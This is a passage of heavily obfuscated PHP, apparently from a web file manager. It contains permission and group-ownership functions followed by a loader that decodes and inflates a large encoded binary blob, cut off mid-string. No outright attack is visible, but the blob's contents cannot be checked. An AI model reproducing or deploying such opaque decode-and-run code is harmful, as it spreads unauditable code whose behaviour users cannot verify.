{ $şº€×Íë = explode($Â±Ğ…æ[18], trim($ï¤Ä¤¨¿[$Â±Ğ…æ[519]], $Â±Ğ…æ[18])); array_shift($şº€×Íë); $êóûîï‡ = $ï¤Ä¤¨¿[$Â±Ğ…æ[525]] . $Â±Ğ…æ[2002] . implode($Â±Ğ…æ[18], $şº€×Íë); } return array($Â±Ğ…æ[421] => $ï¤Ä¤¨¿[$Â±Ğ…æ[42]], $Â±Ğ…æ[88] => KodIO::make($ï¤Ä¤¨¿[$Â±Ğ…æ[403]]), $Â±Ğ…æ[2003] => $êóûîï‡); } private function groupAuthInfo($¿òûç–“, $ú£­ˆ„) { $«†Ü±²  =& $_SERVER[¹àö™Ç¾]; $ÁäÏÑ¤¾ = Model($«†Ü±² [522])->getInfo($ú£­ˆ„); return array($«†Ü±² [2004] => intval($¿òûç–“[$«†Ü±² [414]]), $«†Ü±² [1988] => $¿òûç–“, $«†Ü±² [2005] => LNG($«†Ü±² [2006]), $«†Ü±² [1997] => array($«†Ü±² [421] => $ÁäÏÑ¤¾[$«†Ü±² [42]], $«†Ü±² [88] => KodIO::make($ÁäÏÑ¤¾[$«†Ü±² [97]][$«†Ü±² [403]]), $«†Ü±² [2003] => $ÁäÏÑ¤¾[$«†Ü±² [526]])); } protected function groupRootAuth($½É³„é‹, $Èô¤Î“° = false) { $¦ùÑƒ’ê =& $_SERVER[¹àö™Ç¾]; $Èô¤Î“° = $Èô¤Î“° ? $Èô¤Î“° : USER_ID; $÷Å„¾Î = $Èô¤Î“° . $¦ùÑƒ’ê[2007] . $½É³„é‹; static $şãšï©ö = array(); if (isset($şãšï©ö[$÷Å„¾Î])) { return $şãšï©ö[$÷Å„¾Î]; } $ŠÒÌÅ¬‰ = Model($¦ùÑƒ’ê[522])->getInfo($½É³„é‹); $ìÑş£î = $this->userGroupList($Èô¤Î“°); $“˜Âê˜ñ = isset($ìÑş£î[$½É³„é‹]) ? $ìÑş£î[$½É³„é‹][$¦ùÑƒ’ê[414]] : !1; if ($“˜Âê˜ñ && Model($¦ùÑƒ’ê[507])->authCheckAction($“˜Âê˜ñ[$¦ùÑƒ’ê[414]], $¦ùÑƒ’ê[1828])) { $şãšï©ö[$÷Å„¾Î] = $“˜Âê˜ñ; return $“˜Âê˜ñ; } $§áÏ¿äö = $this->sourceAuthSelect($ŠÒÌÅ¬‰[$¦ùÑƒ’ê[97]][$¦ùÑƒ’ê[403]]); $“ŒöĞ¬‰ = $§áÏ¿äö ? $this->authMake($§áÏ¿äö, $Èô¤Î“°) : !1; $¯ö©óª = $“ŒöĞ¬‰ ? $“ŒöĞ¬‰[$¦ùÑƒ’ê[466]] : !1; $şãšï©ö[$÷Å„¾Î] = $¯ö©óª ? $¯ö©óª : $“˜Âê˜ñ; return $şãšï©ö[$÷Å„¾Î]; } public function authOwnerApply($ñê—é—) { $‰„¨Çº =& $_SERVER[¹àö™Ç¾]; if (empty($ñê—é—[$‰„¨Çº[414]]) || isset($ñê—é—[$‰„¨Çº[2008]]) && $ñê—é—[$‰„¨Çº[2008]]) { return $ñê—é—; } if (AuthModel::authCheckRoot($ñê—é—[$‰„¨Çº[414]][$‰„¨Çº[415]])) { return $ñê—é—; } $ÒŠøóñ§ = Model($‰„¨Çº[1310])->parentLevelArray($ñê—é—[$‰„¨Çº[521]]); $ÒŠøóñ§ = array_merge(array($ñê—é—[$‰„¨Çº[403]]), array_reverse($ÒŠøóñ§)); $˜ŞĞ¯ÒÌ = $this->sourceAuthSelect($ÒŠøóñ§); $¡Û¬åŠ˜ = array(); $õ´¿’Âç = array(); foreach ($˜ŞĞ¯ÒÌ as $Ö‡õñ¶® => $èÒ³ÅÇ) { $ú´­è = $this->authFolderOwnerUser($èÒ³ÅÇ); $¡Û¬åŠ˜[$Ö‡õñ¶®] = $ú´­è; $õ´¿’Âç = array_merge($õ´¿’Âç, $ú´­è[$‰„¨Çº[594]]); if ($ú´­è[$‰„¨Çº[2009]]) { break; } } if (count($õ´¿’Âç) == 0) { $õ´¿’Âç = $this->authFolderOwnerGroup($ñê—é—[$‰„¨Çº[504]]); } $õ´¿’Âç = array_unique($õ´¿’Âç); if (AuthModel::authCheckRoot($ñê—é—[$‰„¨Çº[414]][$‰„¨Çº[415]])) { $õ´¿’Âç[] = USER_ID; } $ñê—é—[$‰„¨Çº[414]][$‰„¨Çº[2010]] = Model($‰„¨Çº[513])->userListInfo($õ´¿’Âç); return $ñê—é—; } private function authFolderOwnerGroup($ÀÔæ‚Öö) { $¶—òãıô =& $_SERVER[¹àö™Ç¾]; $ùş¹„„ƒ = Model($¶—òãıô[1897])->where(array($¶—òãıô[1808] => $ÀÔæ‚Öö))->select(); $âù®í¤– = array(); if (!$ùş¹„„ƒ) { return $âù®í¤–; } foreach ($ùş¹„„ƒ as $ŠÅö»‚‡) { $Œ¶¹àÊ™ = $this->authInfo($ŠÅö»‚‡); if (AuthModel::authCheckRoot($Œ¶¹àÊ™[$¶—òãıô[414]])) { $âù®í¤–[] = $ŠÅö»‚‡[$¶—òãıô[1640]]; } } return $âù®í¤–; } private function authFolderOwnerUser($ÑÛ¢œ°³) { $‹€Ô”Ì =& $_SERVER[¹àö™Ç¾]; $ÍƒºŠËƒ = array(); $³„ÁãÇ = !1; foreach ($ÑÛ¢œ°³ as $âãª—€Ê) { $©ìµå• = $this->authInfo($âãª—€Ê); if ($âãª—€Ê[$‹€Ô”Ì[504]] == $‹€Ô”Ì[200]) { $³„ÁãÇ = !0; } if ($âãª—€Ê[$‹€Ô”Ì[412]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($©ìµå•[$‹€Ô”Ì[414]])) { $ÍƒºŠËƒ[] = $âãª—€Ê[$‹€Ô”Ì[504]]; } } } return array($‹€Ô”Ì[594] => $ÍƒºŠËƒ, $‹€Ô”Ì[2009] => $³„ÁãÇ); } public function authMake($è„µÍÎÀ, $É¬È§Ó = false) { $š‡óÇŸ =& $_SERVER[¹àö™Ç¾]; $Ï›šğÜé = $this->authArrayCheck($è„µÍÎÀ, $É¬È§Ó); if ($Ï›šğÜé[$š‡óÇŸ[2011]]) { $Ï›šğÜé[$š‡óÇŸ[2011]] = $this->sourceAuthInfo($Ï›šğÜé[$š‡óÇŸ[2011]]); } return $Ï›šğÜé; } public function authArrayCheck($ËÙÏ–‚‡, $çâ£œú© = false) { $ÉŒÖˆ¿ =& $_SERVER[¹àö™Ç¾]; if (!$ËÙÏ–‚‡) { return array($ÉŒÖˆ¿[415] => 0, $ÉŒÖˆ¿[466] => !1); } $çâ£œú© = $çâ£œú© ? $çâ£œú© : USER_ID; $¿«ßçÚç = 0; $Î‰ËÎ¾Ÿ = 0; $®üÅãşß = 0; $’®İ»‹Ü = 0; $¥‘›ñÆæ = 0; $¨ÏÀë©Æ = 0; $ú‘øŸ“ä = 1000; $Ñ„ÖÛ›µ = 0; $ÚæÊ•Ìü = 0; $¿Å© = 0; $ÃàÀ‚âÆ = 0; $šñÈşĞ“ = array($ÉŒÖˆ¿[403] => 0); foreach ($ËÙÏ–‚‡ as $šñÈşĞ“) { $äØüÔö° = $this->authInfo($šñÈşĞ“); if (!$äØüÔö°) { continue; } $¦“ÃñÓ¹ = $šñÈşĞ“[$ÉŒÖˆ¿[504]]; $êò¡¿Ä§ = intval($äØüÔö°[$ÉŒÖˆ¿[414]]); if ($šñÈşĞ“[$ÉŒÖˆ¿[412]] == SourceModel::TYPE_USER && $¦“ÃñÓ¹ == $çâ£œú©) { $¿«ßçÚç = !0; $®üÅãşß = $äØüÔö°; $Î‰ËÎ¾Ÿ = $êò¡¿Ä§; } else { if ($šñÈşĞ“[$ÉŒÖˆ¿[412]] == SourceModel::TYPE_GROUP && $this->groupContainUser($¦“ÃñÓ¹, $çâ£œú©)) { $’®İ»‹Ü = !0; $ç³ß–‘¨ = $this->groupStepToUserGroup($¦“ÃñÓ¹, $çâ£œú©); if ($ç³ß–‘¨ < $ú‘øŸ“ä) { $ú‘øŸ“ä = $ç³ß–‘¨; $¥‘›ñÆæ = $êò¡¿Ä§; $¨ÏÀë©Æ = $äØüÔö°; $Ñ„ÖÛ›µ = $¦“ÃñÓ¹; } if ($ç³ß–‘¨ == $ú‘øŸ“ä && $êò¡¿Ä§ >= $¥‘›ñÆæ) { $¥‘›ñÆæ = $êò¡¿Ä§; $¨ÏÀë©Æ = $äØüÔö°; $Ñ„ÖÛ›µ = $¦“ÃñÓ¹; } } else { if ($¦“ÃñÓ¹ == $ÉŒÖˆ¿[200]) { $ÚæÊ•Ìü = !0; $ÃàÀ‚âÆ = $äØüÔö°; $¿Å© = $êò¡¿Ä§; } } } } if ($¿«ßçÚç) { $ØÓ­Í‘ü = $Î‰ËÎ¾Ÿ; $äØüÔö° = $®üÅãşß; $ü¹ÏŒí = LNG($ÉŒÖˆ¿[2012]); } else { if ($’®İ»‹Ü) { $ØÓ­Í‘ü = $¥‘›ñÆæ; $äØüÔö° = $¨ÏÀë©Æ; $»Å¥¨ßò = Model($ÉŒÖˆ¿[522])->getInfo($Ñ„ÖÛ›µ); $ü¹ÏŒí = $ÉŒÖˆ¿[169] . $»Å¥¨ßò[$ÉŒÖˆ¿[526]] . $ÉŒÖˆ¿[2013] . LNG($ÉŒÖˆ¿[2014]); } else { if ($ÚæÊ•Ìü) { $ØÓ­Í‘ü = $¿Å©; $äØüÔö° = $ÃàÀ‚âÆ; $ü¹ÏŒí = LNG($ÉŒÖˆ¿[1985]); } else { $ØÓ­Í‘ü = 0; $äØüÔö° = !1; $ü¹ÏŒí = $ÉŒÖˆ¿[22]; } } } $‹¬ ¯ƒÏ = array($ÉŒÖˆ¿[2004] => intval($ØÓ­Í‘ü), $ÉŒÖˆ¿[1988] => $äØüÔö°, $ÉŒÖˆ¿[2005] => $ü¹ÏŒí, $ÉŒÖˆ¿[1997] => $šñÈşĞ“[$ÉŒÖˆ¿[403]]); return $‹¬ ¯ƒÏ; } private function groupContainUser($ŸË’Ö®Ì, $ì¨ƒ™£Î = false) { return in_array($ŸË’Ö®Ì, $this->userGroupParents($ì¨ƒ™£Î)); } private function groupStepToUserGroup($ì÷çÃÔŠ, $óşàŠê„ = false) { $¶ñ‰µä½ =& $_SERVER[¹àö™Ç¾]; $¬ßÉ—Ñ = $this->userGroupList($óşàŠê„); $Ö¦Õ²®Ü = 1000; $â¿ÒÆ­Ä = $GLOBALS[$¶ñ‰µä½[16]][$¶ñ‰µä½[100]][$¶ñ‰µä½[1908]] == 1; $¿úøüˆ— = $â¿ÒÆ­Ä ? 3 : 2; foreach ($¬ßÉ—Ñ as $¢¿æ¤Á£) { if ($¢¿æ¤Á£[$¶ñ‰µä½[1808]] == $ì÷çÃÔŠ) { return 0; } $ûßöˆ¹³ = explode($¶ñ‰µä½[60], trim($¢¿æ¤Á£[$¶ñ‰µä½[521]], $¶ñ‰µä½[60])); if ($ûßöˆ¹³[0] == $¶ñ‰µä½[200] && count($ûßöˆ¹³) > $¿úøüˆ—) { $„Ãè®¾Ÿ = array_reverse(array_slice($ûßöˆ¹³, $¿úøüˆ—)); $ÅÍü„ğ¹ = array_search($ì÷çÃÔŠ, $„Ãè®¾Ÿ); if ($ÅÍü„ğ¹ !== !1 && $ÅÍü„ğ¹ + 1 <= $Ö¦Õ²®Ü) { $Ö¦Õ²®Ü = $ÅÍü„ğ¹ + 1; } } } return $Ö¦Õ²®Ü; } private function userGroupList($ÆäŸ˜áĞ = false) { $ı³¶œ§ =& $_SERVER[¹àö™Ç¾]; static $ïïğÓÉ = array(); if (isset($ïïğÓÉ[$ÆäŸ˜áĞ])) { return $ïïğÓÉ[$ÆäŸ˜áĞ]; } $¿µ™Æ¯ù = Model($ı³¶œ§[538])->getInfo($ÆäŸ˜áĞ); $ïïğÓÉ[$ÆäŸ˜áĞ] = array_to_keyvalue($¿µ™Æ¯ù[$ı³¶œ§[1986]], $ı³¶œ§[1808]); return $ïïğÓÉ[$ÆäŸ˜áĞ]; } public function userGroupParents($˜³©¤¥û) { $Ó¿ä£—ß =& $_SERVER[¹àö™Ç¾]; static $Æ‰Ïæø÷ = array(); $˜³©¤¥û = $˜³©¤¥û ? $˜³©¤¥û : USER_ID; if (isset($Æ‰Ïæø÷[$˜³©¤¥û])) { return $Æ‰Ïæø÷[$˜³©¤¥û]; } $¹ÆñÈÄ¢ = $this->userGroupList($˜³©¤¥û); $º¾ÂµâÍ = array(); $è¯íõÕ¤ = $GLOBALS[$Ó¿ä£—ß[16]][$Ó¿ä£—ß[100]][$Ó¿ä£—ß[1908]] == 1; $±¼ç¡” = $è¯íõÕ¤ ? 3 : 2; foreach ($¹ÆñÈÄ¢ as $½÷®Šõ) { $½Ñ¸Åë = array($½÷®Šõ[$Ó¿ä£—ß[1808]]); $°Äôå¯ = explode($Ó¿ä£—ß[60], trim($½÷®Šõ[$Ó¿ä£—ß[521]], $Ó¿ä£—ß[60])); if ($°Äôå¯[0] == $Ó¿ä£—ß[200] && count($°Äôå¯) > $±¼ç¡”) { $Î›µ›‘Ä = array_slice($°Äôå¯, $±¼ç¡”); $½Ñ¸Åë = array_merge($½Ñ¸Åë, array_reverse($Î›µ›‘Ä)); } $º¾ÂµâÍ = array_merge($º¾ÂµâÍ, $½Ñ¸Åë); } $Æ‰Ïæø÷[$˜³©¤¥û] = array_unique($º¾ÂµâÍ); return $Æ‰Ïæø÷[$˜³©¤¥û]; } public function authTargetInfoMake($•¾Ëµ„˜) { $Ñö‘ÙóÅ =& $_SERVER[¹àö™Ç¾]; $Ï¸İîÈ¼ = array(); $Ÿºûó‡ = array(); foreach ($•¾Ëµ„˜ as $ßÎ¯Ô) { if ($ßÎ¯Ô[$Ñö‘ÙóÅ[412]] == SourceModel::TYPE_USER) { $Ï¸İîÈ¼[] = intval($ßÎ¯Ô[$Ñö‘ÙóÅ[504]]); } else { if ($ßÎ¯Ô[$Ñö‘ÙóÅ[412]] == SourceModel::TYPE_GROUP) { $Ÿºûó‡[] = intval($ßÎ¯Ô[$Ñö‘ÙóÅ[504]]); } } } if ($Ï¸İîÈ¼) { $Ï¸İîÈ¼ = Model($Ñö‘ÙóÅ[513])->userListInfo($Ï¸İîÈ¼); } if ($Ÿºûó‡) { $¶ôª–í— = array($Ñö‘ÙóÅ[1895] => array($Ñö‘ÙóÅ[419], $Ÿºûó‡)); $Ÿºûó‡ = Model($Ñö‘ÙóÅ[522])->field($Ñö‘ÙóÅ[2015])->where($¶ôª–í—)->select(); $Ÿºûó‡ = array_to_keyvalue($Ÿºûó‡, $Ñö‘ÙóÅ[1808]); } return array($Ñö‘ÙóÅ[2016] => $Ï¸İîÈ¼, $Ñö‘ÙóÅ[2017] => $Ÿºûó‡); } public function authInfo($ÛÕÅ¥«ú) { $£—¸„¼Ò =& $_SERVER[¹àö™Ç¾]; if ($ÛÕÅ¥«ú[$£—¸„¼Ò[1909]]) { $”˜Ê±Æ = Model($£—¸„¼Ò[507])->listData($ÛÕÅ¥«ú[$£—¸„¼Ò[1909]]); if (!$”˜Ê±Æ) { return !1; $‘Â×ÜÉ¦ = Model($£—¸„¼Ò[507])->listData(); $ÊÀÈùÉ­ = array_filter_by_field($‘Â×ÜÉ¦, $£—¸„¼Ò[414], $£—¸„¼Ò[200]); return $ÊÀÈùÉ­; } $…ûòÑ· = array_field_key($”˜Ê±Æ, array($£—¸„¼Ò[401], $£—¸„¼Ò[42], $£—¸„¼Ò[414], $£—¸„¼Ò[1830], $£—¸„¼Ò[1831])); $…ûòÑ·[$£—¸„¼Ò[2018]] = $ÛÕÅ¥«ú; return $…ûòÑ·; } else { return array($£—¸„¼Ò[420] => 0, $£—¸„¼Ò[1814] => $ÛÕÅ¥«ú[$£—¸„¼Ò[1963]], $£—¸„¼Ò[421] => $£—¸„¼Ò[22], $£—¸„¼Ò[1830] => $£—¸„¼Ò[2019]); } } } goto dËâŸŒîµÆ; D„¨‚¬ÓïÓ: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\xb9\xe0\xf6\x99\xc7\xbe", "\xe2\xd6\xca\xe2\xf8\xc4"); $_SERVER[¹àö™Ç¾] = explode(base64_decode('fAF8A3wG'), gzinflate(substr("\37\213\10\0\0\0\0\0\0\23\305\175\7\170\34\325\325\50\55\241\204\136\23\110\140\20\66\222\354\55\222\273\145\313\146\45\255\244\305\53\255\330\135\271\140\231\365"."\354\356\254\64\322\356\314\152\146\126\305\45\241\30\314\117\7\203\201\340\360\10\45\220\37\260\41\224\337\24\103\102\40\16\35\102\150\41\201\374\216\145\233\22\152\200\320"."\337\55\347\226\231\135\301\377\276\367\276\357\31\354\235\173\156\277\367\334\163\317\71\367\334\163\327\336\363\361\35\267\74\264\152\367\125\173\256\372\376\77\337\275\340\205\253"."\327\323\157\364\367\173\350\77\362\175\334\371\373\354\106\376\34\166\376\171\65\65\355\63\366\233\334\271\377\305\167\337\256\156\124\157\127\57\214\105\237\174\52\162\300\63\267".strrev('‡hBğÄZô%¯=9©H'."\n".'lvİ´QÓQıo4Ä 7÷ƒu¡íßv;£“ÃqŞ')."\122\275\232\223\312\230\206\243\31\54\143\123\50\21\151\116\165\205\222\355\64\254\26\213\101\73\73\140\7\125\53\323\247\17\151\121\75\35\114\353\106\60\253\72\152\0\175"."\320\124\373\321\237\151\364\47\323\247\145\6\122\152\332\264\34\55\113\101\45\43\257\33\3\162\113\40\251\151\344\364\136\372\315\12\13\322\237\356\170\324\322\12\246\3\51"."\x3\x90\x19\xc6\x8f\xfc\x6b\xf\xe6\x75\x16\x9f\xea\x8c\x25\x53\x89\xee\xae\xae\x70\x3c\x9\x89\x1a\xe4\xf8\x82\x99\x85\xaf\xa2\x6a\xa9\x5\xe8\x6e\x51\xb3\x6c\x34\x6a\x72\x71\xa9\xa2\x59"."\324\14\27\104\0\160\267\323\252\15\45\265\64\245\132\302\135\321\330\222\124\162\111\127\30\122\244\123\203\45\315\32\245\41\362\231\160\124\313\111\352\5\215\247\30\266\170"."\xbb\x9a\xc2\x6d\x91\x4e\x25\x19\xf\x75\x26\x42\xcd\xc9\x48\xac\x93\x82\x9b\x63\x1d\x1d\x91\x64\x39\x3c\x1e\x8b\x46\x9b\x42\xcd\xb\xca\x63\xba\xe2\xa1\xb6\x8e\x90\x82\xda\x87\x26\x56\x37"."\x72\x66\x8d\xb2\x9c\xc6\x2c\x57\x6a\xe9\x47\xab\xae\xe5\x61\x42\xc\x95\x35\xc7\x19\x2d\xc2\x57\x92\x7f\x21\x74\x32\x4a\xf9\x3c\xd\x74\xf2\xaf\xac\x96\x53\x4b\x79\x18\xad\x16\x39\x50\xb4".strrev('BL'."\n".'cÆ´¨‚¤æá£„K'."\n".'AB4Mkj8'."\n".'¥#Â†Fêc’¢ÀPå@½:Ê‚ô')."\101\265\35\315\122\26\265\207\343\141\5\67\272\261\232\364\265\132\1\174\351\104\103\241\204\242\121\145\274\22\34\255\120\144\305\320\74\25\12\213\305\133\302\161\245\151\211".base64_decode('IkYoYxYKphFApaCZdKSmhuNx+uGDZRiN4EmDQKy1NRHmIejcKVHUkqmAn65QNpc=')."\x77\x52\x43\x6a\xbe\xc4\xd0\x14\x96\x4b\x35\xfc\xc0\xaf\x69\x3\xea\xe\xea\x86\x5e\x2\x34\x85\x22\x4c\xd3\x66\x2d\x86\x8f\x12\x4b\xad\x31\x88\x96\x85\x8f\x2\xca\x6f\xc2\xca\x43\xcb\x70"."\210\176\66\316\243\277\163\40\121\32\323\207\41\315\162\122\232\221\61\263\272\1\213\165\76\40\235\352\364\265\130\210\56\130\120\222\31\310\230\305\321\16\163\110\42\63\121"."\xbe\xc2\x72\x66\x3e\xab\x59\x22\x5c\x44\xd9\xe5\x18\xe8\x8e\x8b\x48\x75\x96\xa\x72\x12\x1e\x44\xe4\x28\x9f\xb5\xd8\xc2\xfc\xb6\x94\x68\xe9\xeb\xb9\x51\xb1\x0\x6d\xb3\x64\x65\x10\x61\xcc".strrev('îôL´~ *D…ZjÖIÀÈä¬c(­¯©,Ğ›5Mæ.êıfÖõÒ$=Ioo"™')."\12\21\3\154\241\144\245\41\14\326\54\75\303\377\365\262\245\47\241\177\152\201\26\366\100\233\372\264\174\76\245\215\150\260\222\12\331\351\66\353\144\320\306\144\31\101\150"."\60\22\113\365\251\166\137\107\166\172\212\344\142\44\66\253\215\4\212\175\105\130\346\174\145\367\270\60\35\117\113\247\351\204\245\15\45\157\146\324\274\334\105\372\335\347\70"."\xc5\x84\x66\x64\x5b\x39\x45\xcf\x9a\xc3\x6\x19\xa9\xa2\xc6\x88\x7f\x8b\x4f\xc9\x2a\x1d\xca\x12\xa5\xbd\x41\x6f\xb0\x59\xc6\x42\x9e\x7f\xb1\xde\x71\x98\xcd\x81\xce\x8\xa0\x4a\x15\xdf\x8f".strrev('ßºVPeÕïK1ı‡7Ÿ(y™f–Ñ›ûmš2e¤*ic¶üsGšÓtuFzò').strrev('ÖÓEÛ¢ÖKIÍãAA Ë?–iÎÃT¶§ËbÏó“’Æ¤ü—€HÁG5Ye€kµ1ù')."\161\363\32\24\325\161\324\114\37\46\27\242\370\106\106\3\213\272\245\331\254\176\245\255\43\11\5\241\34\232\277\313\122\173\13\152\203\122\54\245\121\157\141\251\125\200\321"."\xd4\xd0\xdd\x6\x25\x83\x83\x3e\xa5\x50\xb2\x1d\xbf\xa5\x21\x5a\xa2\xa3\xfd\xa\xe6\x25\x92\xf3\x77\xe0\x75\xa0\x6b\x59\x7f\x2\x91\x5c\x0\x4f\xad\x9b\xa6\xa0\xa9\x56\x58\x1c\x85\xb6\x27".base64_decode('k12pSCvaUzvDqY5Qshm4gbCj9rI2RxEh5UUy4GI/Wg8YGTpRXwWwyxzWLFRx02g=')._kodDe('KyV2WVPZxnM7qDhK9QW1HNYtH6vx513k1YI8DS1/k8cwEd6b3+dZcC1WHw8VC1KB').strrev('ÀğÚF‹‹8#,W<fF'."\r".',j<E©òÃŒú,µÇ÷'."\n".'«üÍcvP¢äÖ±§')."\264\370\155\224\310\57\247\142\145\107\365\202\216\333\356\360\30\62\222\150\253\156\203\6\5\111\207\32\173\372\46\325\364\144\47\327\372\321\277\223\152\227\366\264\4\46\55"."\233\37\324\105\236\140\175\240\136\231\122\67\103\351\102\274\203\256\346\25\350\164\131\212\72\45\266\300\75\54\2\103\15\323\320\276\145\160\360\346\43\55\123\317\260\2\277"."\21\76\245\73\234\110\246\72\302\311\366\130\13\324\36\16\301\127\324\244\113\221\365\166\51\375\131\26\20\204\25\341\103\244\240\366\172\310\55\16\165\230\226\346\206\10\362"."\xbf\x48\xcf\x32\x7a\x8c\x83\xed\x9a\xde\xdb\x7\x7d\xd7\x71\x69\x19\x33\x6f\x5a\x6a\x1e\x53\x25\x86\xe0\x1a\xa3\x14\xbd\x7a\xe\xe6\x8e\x12\x40\x11\x48\xe8\x85\x22\xa3\x53\x4e\x5f\xa9\x90"."\x96\x3e\x81\xd2\xda\x8\x17\xd8\x3e\xd1\x67\xf2\x7d\xa\xb1\xb2\xb0\x67\x7\x21\xe1\xc4\x29\xad\x8c\xd2\x6\x13\x53\xd1\xff\x82\xac\x66\xcd\x82\xca\x98\x59\x42\x82\xb4\x2c\xa5\x41\x14\x34"."\xc9\x15\xd3\xae\xa9\x62\xe3\x73\x2c\xc7\xc4\x50\xcb\x95\xa4\x43\x73\xfa\x4c\x98\x24\xc4\xb1\x43\x93\x4a\xbc\x6d\xac\x95\x59\x2d\xaf\xb1\xd1\xe8\xd3\x18\x89\xae\x83\x64\x68\x8b\xe1\x63\x25"."\61\340\210\170\72\232\330\33\165\73\216\162\142\126\210\205\27\141\136\125\0\34\236\64\217\166\207\130\272\37\55\45\32\116\351\166\253\264\213\247\114\22\207\32\257\212\364"."\135\226\226\323\141\101\32\150\306\72\124\153\200\145\100\63\44\266\21\34\220\12\153\355\216\106\123\315\261\316\44\342\177\51\144\121\74\222\14\63\34\15\265\244\102\315\135".base64_decode('fFMUMw4JMDEpp/4UMjQFOoaaExRbEKLORdOwNT/IR37BJ5dFZQXVB5oiKL+H8I8=')."\xf8\xd5\xc2\xa\x7f\x1\xd\x8a\x9f\x37\xd4\xbd\x3f\x2a\x49\x79\x9b\x8d\xc0\x2c\xa\x42\x8e\x87\x11\x89\x30\x6c\x63\xee\x8a\x25\x20\xc3\x7c\xc\x45\x4c\x4f\x5a\xb3\xa0\xb2\xae\x6e\x88\x2a"."\x48\x18\xd4\x16\x4e\xb2\x4d\x56\x5\x5e\x27\xb4\x28\xc1\xa8\x6f\x9\x25\xb4\xf4\x15\xaa\xe8\xcb\x7c\xd6\x10\xd6\x83\x42\x5e\x30\x70\xee\xee\xf8\xc5\x90\x27\xdb\x23\x9d\xb\x52\x1d\xb1\x96"."\160\64\25\351\104\344\47\131\16\357\356\152\11\261\71\224\341\115\61\46\175\2\264\33\21\240\205\241\150\304\233\74\274\70\222\110\46\52\106\41\130\167\330\23\203\304\265"."\256\170\270\65\262\230\7\133\43\341\150\113\42\325\34\152\156\27\151\72\103\35\20\110\345\260\300\144\7\335\351\123\210\222\46\270\330\225\32\302\42\244\311\245\154\131\322"."\x49\x31\x1e\x3e\x25\x90\x7\xed\x98\x1a\xa0\x18\x74\x17\xb\xae\xa4\x27\x20\xb6\x66\xcc\x12\xa3\xf3\x9c\xbb\x2b\x30\xe2\x51\x50\x61\xf5\xa8\x6c\x37\xac\xa1\x3f\xb5\x4a\x28\xa1\x38\xc5\x14"."\x27\x13\xe9\x51\xfe\x49\xba\xc1\xc2\x88\x8f\x83\xfa\x15\xa0\xea\x65\x2d\x48\xe1\x34\x4d\x5a\x8e\x13\xe8\xca\x80\x50\xce\xe1\x8b\xdd\x13\x46\x58\x2f\xe2\xd0\xc\x84\x88\x84\x8c\x30\x81\xcc"."\x8\x54\xa3\xa3\x35\x64\x39\x21\xd6\x9c\x9c\x90\x4e\x53\x31\x24\xc6\x87\xb0\x6c\x9b\x5a\x14\x8f\x75\xb6\x41\x86\xe1\x3e\x8d\x35\x20\x2\xc3\x5f\xc3\x38\x28\x10\x71\x1d\x41\xa9\x10\xfb\xa3"."\62\131\107\14\172\277\311\206\162\25\375\71\221\376\40\156\16\52\327\14\66\352\151\114\264\331\266\303\76\162\150\65\60\202\153\226\170\155\151\323\314\263\5\212\230\0\116".base64_decode('KbiI3G8zJBlhNGYy27lg40jGFoQ7UwyzaEjCRgpAQmcsDgPimANMAKKR8XCCLW8=')."\113\33\54\351\154\270\202\201\311\200\305\32\332\233\240\372\340\151\75\303\223\153\226\372\47\7\226\241\217\332\111\47\321\40\204\172\2\256\340\4\310\137\262\170\156\314\33".strrev('ìiúa?Î€N5m7Å9[,'."\0".'dí@äÙ¶EªşCK'."\r".'ùšÁ=‚zkóØÕ')."\x99\x3f\xb1\xc7\x7f\xe2\x4f\x97\x9f\xb4\xb4\x67\x59\x75\xc3\xe4\xe3\x7b\x2\x27\xf4\xc\x2f\x9b\x54\x3b\x9f\xd5\x93\x29\x59\x48\xb8\xcb\x8c\xf2\xa6\x66\x27\xd7\xa0\x26\x21\x9e\x89\x27\x31"."\10\255\223\22\260\210\25\172\121\100\127\316\130\315\340\150\16\265\136\221\143\251\277\147\362\262\371\122\76\11\344\255\13\361\104\210\360\366\361\164\41\377\251\270\147\74\53"."\136\367\200\37\45\43\43\250\47\136\27\151\65\3\164\100\357\65\370\22\102\233\75\227\246\335\254\372\312\211\364\167\65\233\310\136\155\204\221\6\43\247\133\200\235\45\103".base64_decode('H2TKAkMbhA/TYfid1pxhjaEHgrvCCDmYPIeipFCecH9QA5aEOI5yZNKLKcx6DfM=')."\x50\x56\x33\x60\x9e\xf6\x85\xd4\x76\x46\x2d\x6a\x9\xa9\x87\xa9\x54\x32\xd4\x14\xd\xa7\x18\x85\x1\x4a\xcc\xc2\x84\x2a\x36\x71\xc5\x1a\xea\x9a\xa0\xa8\x8c\x3e\x64\x4\x9f\x4e\x44\x12\x58"."\xf9\xf6\x60\x5e\x21\x84\x41\xd1\x2c\xcb\xb4\x1a\x88\x2e\xd4\x2e\x15\x31\xcf\xa6\xa0\x19\x47\x63\xab\x20\x41\x5b\x69\x9c\xa7\xd0\x21\x87\x7c\x29\x79\x2\x8a\x2a\x63\x10\xb0\x8\xac\x89\x45"."\217\51\24\264\251\50\146\310\106\234\26\143\173\202\65\75\75\245\245\132\166\331\122\204\370\252\77\267\154\345\324\325\265\214\225\17\366\240\77\54\20\252\240\355\112\161\152"."\230\102\33\163\0\267\203\353\55\134\1\36\115\203\246\305\171\243\242\213\273\166\114\107\315\273\212\110\142\10\43\115\154\343\6\111\237\316\166\124\120\54\274\225\113\152\102"."\102\116\73\271\46\214\53\54\44\75\25\316\221\320\234\0\117\341\223\42\123\50\354\122\331\66\126\61\142\157\240\345\324\54\155\165\124\337\222\30\265\35\255\340\322\55\332"."\32\326\75\267\226\362\171\207\363\370\171\175\0\152\200\265\262\274\122\332\126\323\142\162\356\44\250\267\152\122\245\204\21\303\100\122\251\214\133\142\127\155\13\41\376\45\251"."\324\60\75\234\22\351\124\232\142\261\150\70\324\251\340\15\34\66\36\304\35\44\302\135\41\264\153\141\211\71\221\14\203\152\60\322\342\147\345\56\366\107\100\156\342\37\172"."\x96\xcd\x13\x22\x76\xe\x83\x82\x82\xa\x42\x98\x7b\xf4\x61\x95\x8c\xf\x73\x11\x3e\xd4\x5c\x1f\x96\x89\x7c\x82\x75\xf7\x9\xd\x97\x6f\x48\xd7\x86\xc9\x7\xe7\xa0\x7d\xc0\x58\xfb\x1c\xd5".base6